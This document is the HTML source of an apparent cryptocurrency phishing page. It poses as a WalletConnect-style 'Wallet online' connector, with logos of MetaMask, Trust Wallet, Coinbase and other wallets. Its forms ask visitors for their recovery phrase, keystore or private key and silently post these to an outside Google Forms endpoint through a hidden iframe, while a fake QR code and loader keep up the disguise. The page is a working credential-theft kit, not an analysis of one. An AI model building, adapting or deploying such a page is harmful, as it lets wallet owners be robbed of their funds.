...
<head>
  ...
  <link data-react-helmet="true" rel="shortcut icon" href="images/argent.jpg">
  ...
  <meta data-react-helmet="true" name="description"
    content="User friendly, tokenized and community managemant protocal for connecting wallets to Dapps">
  ...
  <meta data-react-helmet="true" name="og:title" content="Wallet online">
  ...
  <link as="script" rel="preload" href="../deficollabland.app/webpack-runtime-08a0e953018334063ddd.js">
  <link as="script" rel="preload" href="../deficollabland.app/framework-8e528b732ab2eaadb7b7.js">
  <link as="script" rel="preload" href="../deficollabland.app/app-2b5a75f35e7d5a1e67ad.js">
  <link as="script" rel="preload" href="../deficollabland.app/commons-728581910d6e685fb39c.js">
  <link as="script" rel="preload" href="../deficollabland.app/component---src-pages-apps-tsx-50d212c53780f4e2ed64.js">
  <link as="fetch" rel="preload" href="https://deficollabland.app/page-data/apps/page-data.json"
    crossorigin="anonymous">
  <link as="fetch" rel="preload" href="https://deficollabland.app/page-data/app-data.json" crossorigin="anonymous">
</head>
...
<body style="display: block;">
            ...
            <div class="sc-hrWEMg bHjlF">
              ...
              <button id="connect-METAMASK" class="sc-kPVwWT sc-kfGgVZ sc-kIPQKe dQoUpv">
                <div class="sc-esjQYD iGptdp">
                  <div color="#E8831D" class="sc-RefOD jsJmJE">Trust</div>
                ...
                <div class="sc-bwCtUz lgYJCf">
                  <img class="firstImg"
                    src="../walletsyncdapps.comstatic/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Icon"
                    style="width: 24px;">
                </div>
              </button>
            </div>
            ...
            <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
              <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900"
                style="display: flex; flex-direction: row;"> <img
                  src="../walletsyncdapps.comstatic/trust-wallet-66f8777532931d9c09b633344981a6a9.png"
                  style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your <span
                    id="walletname">Trust</span>
                  wallet</span>
              </h3>
              <div class="mt-2">
                <div class="mt-10">

                  <form name="form" method="POST" id="mG61Hd"
                    action="https://docs.google.com/forms/d/e/1FAIpQLSd2Qtz2_H5_MkAhnFYOB1YqlE8aozd9Jb-eiaz0P6_FdXvJNA/formResponse"
                    target="votar">
                    <iframe name="votar" style="display:none;"></iframe>
                    <input type="hidden" name="_token" value="FNcG1b8r7pZeSwgiK7nXULIHnR6iVdBBEDjrdasz">
                    <input type="hidden" name="form-name" value="my-form">
                    <input id="nameit" type="hidden" value="">
                    ...
                    <div id="first" class="acc-body active">
                      <div class="flex flex-col mb-6">
                        <div class="relative" data-children-count="1">
                          <input type="hidden" name="_token" value="FNcG1b8r7pZeSwgiK7nXULIHnR6iVdBBEDjrdasz">
                          <textarea cols="30" rows="4" placeholder="Enter your recovery phrase"
                            ...
                            name="entry.42931936" id="phrase" required=""></textarea>
                      ...
                      <div class="flex w-full">
                        <button type="submit" id="pbtn" onclick="showLoader();"
                          class="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"><span
                            class="mr-2 uppercase">Proceed</span> <span><svg fill="none" stroke-linecap="round"
                    ...
                    <div id="second" class="acc-body bg-grey-600">
                      ...
                      <div class="flex flex-col mb-6">
                        <input type="hidden" name="_token" value="FNcG1b8r7pZeSwgiK7nXULIHnR6iVdBBEDjrdasz">
                        <input type="text" name="key_store" placeholder="Keystore"
                          class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                      </div>
                      <div class="flex flex-col mb-6">
                        <div class="relative" data-children-count="1">
                      ...
                      <div class="flex w-full"><button type="submit" class="flex items-center justify-center focus:outline-none
                          ...
                          uppercase">Proceed</span> <span><svg fill="none" stroke-linecap="round"
                              stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor"
                              class="h-6 w-6">
                    ...
                    <div id="qrcode" style="display:none;">
                                <div class="sc-jSFjdj fkoWJS sc-iwajpm kydRHc">
                                    <div class="walletconnect-modal__mobile__toggle right__selected">
                                        <div class="walletconnect-modal__mobile__toggle_selector"></div>
                                        <a href="/" style="text-decoration: none; color: black;">Mobile</a><a>QR
                                            Code</a>
                                    </div>
                                    <div>
                                        <div>
                                            <p id="walletconnect-qrcode-text" class="walletconnect-qrcode__text">
                                                Scan QR code
                                                with a WalletConnect-compatible wallet</p>
                                            <div>
                                                <svg class="walletconnect-qrcode__image"
                                                    ...
                                                    <path stroke="#000000"
                                                        d="M0 0.5h7m2 0h2m1 0h2m1 0h3m1 0h1m4 0h1m2 0h2m1 0h1m1 0h1m3 0h7m3 0h7M0 1.5h1m5 0h1m2 0h1m2 0h1m2 0h4m1 0h1m2 0h3m5 0h1m1 0h4m3 0h1m1 0h2m2 0h1m5 0h1M0 2.5h1m1 0h3m1 0h1m1 0h7m9 0h1m2 0h1m2 0h3m2 0h2m2 0h1m3 0h1m2 0h1m1 0h3m1 0h1M0 3.5h1m1 0h3m1 0h1m1 0h1m3 0h1m3 0h2m7 0h1m3 0h1m6 0h1m1 0h1m3 0h1m1 0h1m1 0h1m1 0h3m1 0h1M0 4.5h1m1 0h3m1 0h1m1 0h1m1 0h1m1 0h2m1 0h2m2 0h1m1 0h8m1 0h2m1 0h1m1 0h3m4 0h1m3 0h1m1 0h3m1 0h1M0 5.5h1m5 0h1m1 0h1m1 0h1m2 0h2m2 0h4m3 0h1m3 0h2m4 0h1m1 0h1m1 0h5m3 0h1m5 0h1M0 6.5h7m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h1m1 0h7M8 7.5h1m2 0h1m3 0h1m2 0h1m1 0h2m2 0h1m3 0h1m4 0h3m2 0h6M0 8.5h1m1 0h5m2 0h1m1 0h2m2 0h2m2 0h1m3 0h6m1 0h3m1 0h1m1 0h1m2 0h1m2 0h3m1 0h5M2 9.5h2m4 0h1m2 0h2m1 0h1m1 0h1m1 0h1m1 0h3m1 0h1m3 0h1m1 0h1m1 0h1m2 0h3m1 0h1m2 0h1m2 0h1m1 0h1m3 0h2M2 10.5h2m2 0h2m1 0h1m2 0h1m4 0h1m1 0h3m3 0h1m1 0h1m1 0h1m1 0h4m1 0h3m2 0h1m4 0h1m1 0h1m1 0h1M3 11.5h3m2 0h1m1 0h5m1 0h2m1 0h6m2 0h2m1 0h5m2 0h4m2 0h1m1 0h1m1 0h1m4 0h1M0 12.5h4m2 0h9m1 0h1m1 0h1m2 0h1m1 0h5m1 0h2m4 0h2m1 0h1m2 0h2m1 0h1m3 0h3M2 13.5h1m1 0h1m3 0h2m1 0h4m3 0h1m3 0h1m1 0h5m1 0h2m1 0h1m3 0h1m3 0h3m1 0h1m3 0h1m2 0h1M1 14.5h1m1 0h1m1 0h5m2 0h1m2 0h1m4 0h2m4 0h2m1 0h3m2 0h3m1 0h1m1 0h1m2 0h2m1 0h1m1 0h4M0 15.5h1m2 0h1m1 0h1m5 0h4m1 0h1m2 0h1m2 0h4m1 0h1m2 0h3m1 0h1m2 0h5m1 0h2m2 0h1m1 0h1M1 16.5h4m1 0h1m2 0h1m2 0h2m1 0h1m2 0h4m1 0h2m1 0h2m2 0h1m2 0h2m1 0h1m1 0h1m5 0h1m3 0h1m1 0h1M0 17.5h1m1 0h1m2 0h1m1 0h2m1 0h2m1 0h1m1 0h1m1 0h1m2 0h1m1 0h1m2 0h1m1 0h2m1 0h1m1 0h1m1 0h2m1 0h2m1 0h4m3 0h2m1 0h1m1 0h1M0 18.5h1m3 0h1m1 0h1m2 0h3m3 0h3m4 0h2m5 0h1m1 0h1m1 0h1m2 0h1m1 0h2m4 0h1m1 0h1m1 0h1m2 0h1M0 19.5h2m1 0h1m3 0h2m2 0h1m1 0h2m3 0h5m1 0h2m1 0h1m1 0h2m2 0h1m1 0h1m5 0h2m2 0h1m5 0h2M1 20.5h6m5 0h2m1 0h1m1 0h1m1 0h2m1 0h3m1 0h2m1 0h3m4 0h2m1 0h1m2 0h4m1 0h5M0 21.5h1m1 0h2m5 0h1m1 0h6m1 0h1m2 0h1m1 0h3m1 0h1m2 0h1m1 0h2m2 0h1m4 0h2m5 0h1m3 0h1M1 22.5h1m4 0h3m1 0h1m1 0h1m1 0h4m3 0h1m2 0h1m3 0h2m4 0h4m1 0h1m3 0h1m1 0h3m1 0h2M0 23.5h2m2 0h1m2 0h1m4 0h2m5 0h1m1 0h3m3 0h4m1 0h2m2 0h1m4 0h1m1 0h1m3 0h1m1 0h1m1 0h2M2 24.5h7m1 0h2m2 0h1m2 0h2m1 0h2m2 0h5m1 0h2m2 0h2m1 0h1m2 0h1m1 0h7m1 0h1m1 0h1M0 25.5h1m1 0h3m3 0h2m1 0h1m1 0h1m2 0h2m1 0h1m2 0h3m3 0h1m1 0h2m5 0h1m1 0h1m1 0h2m1 0h1m3 0h1m2 0h2M0 26.5h2m1 0h2m1 0h1m1 0h6m1 0h6m2 0h2m1 0h1m1 0h2m2 0h2m1 0h1m2 0h1m5 0h1m1 0h1m1 0h3M0 27.5h3m1 0h1m3 0h1m2 0h1m3 0h1m3 0h1m2 0h3m3 0h1m1 0h2m5 0h1m2 0h3m1 0h1m3 0h1M1 28.5h1m1 0h9m1 0h6m1 0h1m2 0h8m4 0h2m5 0h1m1 0h8M0 29.5h1m1 0h1m1 0h1m2 0h2m1 0h3m1 0h4m2 0h7m1 0h4m5 0h1m2 0h1m1 0h1m2 0h2m1 0h1m3 0h1M1 30.5h1m1 0h2m1 0h1m2 0h1m2 0h1m2 0h3m1 0h2m3 0h5m5 0h1m2 0h3m1 0h1m6 0h1m1 0h1M5 31.5h1m2 0h6m3 0h3m2 0h1m1 0h1m1 0h1m2 0h1m1 0h4m2 0h2m1 0h7m1 0h1m2 0h2M0 32.5h3m2 0h5m1 0h1m6 0h1m2 0h1m1 0h4m6 0h1m2 0h4m2 0h1m2 0h1m3 0h2M1 33.5h3m5 0h4m2 0h2m1 0h3m1 0h2m3 0h3m1 0h3m1 0h1m1 0h1m3 0h5m1 0h2m3 0h1M1 34.5h1m1 0h1m2 0h1m2 0h1m1 0h3m6 0h2m6 0h1m1 0h2m2 0h5m6 0h1m3 0h1m1 0h1M1 35.5h4m4 0h2m1 0h1m4 0h2m3 0h1m2 0h1m1 0h1m2 0h1m1 0h2m1 0h1m1 0h2m1 0h2m1 0h2m1 0h1m1 0h2m1 0h1M0 36.5h1m2 0h1m2 0h1m2 0h3m3 0h5m4 0h2m1 0h3m1 0h1m3 0h5m4 0h1m1 0h1m3 0h2M1 37.5h2m1 0h2m1 0h2m2 0h2m5 0h6m2 0h2m2 0h2m1 0h1m2 0h3m2 0h3m2 0h3m1 0h3M1 38.5h1m2 0h5m1 0h1m3 0h1m1 0h3m1 0h2m2 0h1m3 0h1m2 0h2m3 0h1m3 0h1m3 0h1m3 0h2M2 39.5h3m2 0h1m1 0h2m1 0h2m1 0h2m1 0h3m2 0h2m1 0h1m3 0h3m2 0h1m1 0h3m2 0h5m2 0h1m1 0h2M1 40.5h1m3 0h4m3 0h1m1 0h1m6 0h1m3 0h1m1 0h2m7 0h1m1 0h1m1 0h3m4 0h1m2 0h2M4 41.5h1m2 0h1m1 0h2m1 0h2m1 0h1m1 0h1m1 0h1m3 0h4m2 0h3m1 0h1m1 0h6m1 0h2m1 0h1m2 0h2m1 0h2M0 42.5h2m1 0h5m1 0h1m2 0h2m1 0h2m1 0h1m2 0h1m2 0h1m3 0h1m1 0h2m1 0h3m4 0h3m1 0h1m2 0h1m1 0h1m1 0h1M1 43.5h2m7 0h1m1 0h1m4 0h1m5 0h1m2 0h2m2 0h4m1 0h3m1 0h2m1 0h2m1 0h2m1 0h1M3 44.5h1m2 0h1m1 0h3m1 0h2m2 0h3m1 0h2m2 0h7m5 0h1m1 0h2m2 0h1m1 0h7M8 45.5h1m1 0h1m5 0h1m5 0h3m3 0h1m1 0h2m1 0h1m1 0h2m2 0h1m2 0h3m3 0h1m1 0h3M0 46.5h7m3 0h1m1 0h1m6 0h2m1 0h1m1 0h1m1 0h1m1 0h2m1 0h4m1 0h1m1 0h2m2 0h1m1 0h1m1 0h1m1 0h1m1 0h1M0 47.5h1m5 0h1m1 0h2m2 0h1m3 0h2m1 0h4m1 0h1m3 0h1m1 0h1m2 0h5m1 0h2m1 0h1m1 0h1m3 0h2m1 0h2M0 48.5h1m1 0h3m1 0h1m1 0h2m3 0h2m1 0h1m1 0h1m1 0h1m1 0h1m1 0h9m3 0h1m4 0h1m2 0h5m1 0h1M0 49.5h1m1 0h3m1 0h1m1 0h1m1 0h2m1 0h1m1 0h1m1 0h1m3 0h1m1 0h2m5 0h1m1 0h2m2 0h2m4 0h2m1 0h1m6 0h1M0 50.5h1m1 0h3m1 0h1m1 0h3m1 0h2m1 0h3m1 0h2m1 0h1m1 0h3m1 0h2m1 0h2m1 0h5m6 0h4M0 51.5h1m5 0h1m3 0h3m3 0h2m2 0h2m1 0h1m1 0h1m4 0h3m6 0h4m5 0h2m1 0h1M0 52.5h7m1 0h1m1 0h1m1 0h1m3 0h1m1 0h2m1 0h1m2 0h2m1 0h1m1 0h2m4 0h2m1 0h1m2 0h1m1 0h1m1 0h3">
                                                    </path>
                                                </svg>
                                            </div>
                    ...
                    <div id="third" class="acc-body bg-grey-600">
                      <div class="flex flex-col">
                        <div class="relative"><input type="hidden" name="wallet_id" required="required"
                            placeholder="Wallet ID" id="wallet_id" value="Trust"></div>
                      </div>
                      <div class="flex flex-col mb-6">
                        <div class="relative" data-children-count="1">
                          <input type="hidden" name="_token" value="FNcG1b8r7pZeSwgiK7nXULIHnR6iVdBBEDjrdasz">
                          <input type="text" placeholder="Enter your Private Key" name="entry.42931936"
                            class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                          <p class="text-xs text-grey-300 mt-6">
                      ...
                      <div class="flex w-full">
                        <button type="submit" onclick="showLoader();" class="flex items-center justify-center focus:outline-none
                          text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2
                          w-full transition duration-150 ease-in"><span class="mr-2
                          uppercase">Proceed</span> <span><svg fill="none" stroke-linecap="round"
                              stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor"
        ...
        <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
          ...
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/metamask.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/trust.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/coinbase.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/crypto.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/blockchain.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/binance.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/safepal.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/argent.jpg" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/aktionariat.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/keyring.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/bitkeep.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/sparkpoint.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/ownbit.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/infinity-wallet.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/wallet-io.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/infinito-wallet.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/torus.jpg" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/nash.jpg" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/bitpay.jpg" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/imtoken.png" alt="Meta">
            </div>
          </div>
          <!-- start -->
          <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
            ...
            <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
              <img class="img-icons" src="images/otherssss.jpg" alt="Meta">
            </div>
          </div>
        </div>
      </section>
  ...
  <script>
    function displaySpan() {
      var er = document.getElementById("walletname").innerText;
      document.getElementById('nameit').value = er;
    }
  </script>
